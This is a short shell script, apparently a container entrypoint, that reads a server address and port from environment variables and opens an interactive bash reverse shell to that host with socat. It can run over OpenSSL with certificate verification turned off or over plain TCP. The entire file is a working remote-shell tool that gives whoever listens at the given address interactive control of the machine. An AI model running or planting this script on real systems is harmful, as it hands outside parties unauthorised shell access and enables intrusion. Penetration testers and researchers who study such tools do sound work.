#!/bin/ash
# shellcheck shell=bash

# Check for required env variables
error="false"
[[ -z "${SERVER_ADDRESS}" ]] && echo "SERVER_ADDRESS variable not set." && error="true"
[[ -z "${SERVER_PORT}" ]] && echo "SERVER_PORT variable not set." && error="true"
# Exit if error encountered
[[ "${error}" == "true" ]] && echo "Error encountered. Exiting" && exit 1

# Invoke reverse shell, using bash for better tty experience
if [ "${ENABLE_SSL}" == "true" ]
then
  echo "Invoking encrypted reverse shell with socat to dest ${SERVER_ADDRESS}:${SERVER_PORT}"
  set -ex
  socat OPENSSL:"${SERVER_ADDRESS}:${SERVER_PORT}",verify=0 EXEC:'/bin/bash --noprofile --norc -i',pty,stderr,setsid,sigint,sane,raw
else
  echo "Invoking unencrypted reverse shell with socat to dest ${SERVER_ADDRESS}:${SERVER_PORT}"
  set -ex
  socat EXEC:'/bin/bash --noprofile --norc -i',pty,stderr,setsid,sigint,sane,raw "tcp:${SERVER_ADDRESS}:${SERVER_PORT}"
fi
